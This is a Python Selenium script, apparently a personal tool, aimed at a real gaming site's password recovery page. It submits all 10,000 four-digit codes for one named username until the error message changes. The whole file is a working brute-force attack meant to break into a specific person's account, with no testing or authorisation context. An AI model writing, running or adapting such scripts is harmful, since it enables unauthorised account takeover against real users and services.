from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException
import itertools

# Update the path to the ChromeDriver executable
chrome_driver_path = 'C:\WebDriver\chromedriver.exe'

# Set up Chrome options
options = Options()
options.binary_location = 'C:\Program Files\Google\Chrome\Application\chrome.exe'

# Set up ChromeDriver service
service = Service(chrome_driver_path)

# Create a new instance of the Chrome driver
driver = webdriver.Chrome(service=service, options=options)

# Open the website
driver.get('https://www.gameclub.ph/FindPassword/FindPassword?sitecode=LB')

# Generate the combinations
combinations = [''.join(x) for x in itertools.product('0123456789', repeat=4)]

# Loop through the combinations
for combination in combinations:
    try:
        # Find the username input field and enter the combination
        input_box = driver.find_element(By.CSS_SELECTOR, 'input#uname.form-control')
        input_box.clear()
        input_box.send_keys('daveburaot')
        
        # Find the password input field and enter the combination
        password_box = driver.find_element(By.ID, 'password')
        password_box.clear()
        password_box.send_keys(combination)
        
        # Submit the form
        driver.find_element(By.CSS_SELECTOR, 'button#btn-submit.btn-special').click()
        
        # Check if the error message is displayed
        error_message = driver.find_element(By.CSS_SELECTOR, '.alert.alert-danger').text
        if error_message == 'The Username is incorrect. Please try again.':
            # Clear the input fields and try another combination
            input_box.clear()
            password_box.clear()
        else:
            # Stop the process as there are no errors
            break
    
    except NoSuchElementException:
        # Handle any other exceptions or errors that may occur
        print('An error occurred. Skipping this combination.')

# Quit the driver
driver.quit()
